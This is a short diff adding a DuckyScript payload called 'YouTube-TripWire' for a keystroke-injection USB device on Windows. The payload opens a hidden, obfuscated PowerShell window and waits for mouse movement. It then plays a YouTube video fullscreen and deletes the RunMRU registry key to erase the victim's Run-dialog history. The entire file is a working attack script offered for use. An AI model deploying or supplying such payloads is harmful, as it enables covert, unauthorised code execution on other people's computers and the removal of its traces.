@@ -1,0 +1,17 @@
+REM     Title: YouTube-TripWire
+
+REM     Author: Arpanb Ghosh from I am Jakoby
+
+REM     Description: Plays any YouTube video after a mouse movement is detected
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 3}};saps https://youtu.be/R8lHaEZYpCU;sleep 3;$o=New-Object -ComObject WScript.Shell;$o.SendKeys('f')
+ENTER
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+ENTER
